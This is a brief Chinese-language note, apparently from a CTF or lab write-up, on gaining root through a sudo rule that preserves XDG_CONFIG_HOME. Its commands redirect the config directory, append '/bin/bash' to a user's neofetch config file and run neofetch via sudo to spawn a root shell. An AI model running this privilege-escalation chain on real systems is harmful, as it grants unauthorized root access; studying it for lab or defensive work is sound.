# 存在env\_keep+=XDG\_CONFIG\_HOME

```bash
1. 查看用户xdg设置情况
echo "$XDG_CONFIG_HOME"
2. 查看用户home
echo "$HOME"
3. 强制修改xdg指向
export XDG_CONFIG_HOME="$HOME/.config" 
4. 写入
echo "/bin/bash" >> /home/thomas/.config/neofetch/config.conf 
5. 执行
sudo /usr/bin/neofetch \"\" （后面的\"\" 是他们来sudo -l就自带的防止夹带命令的）
```
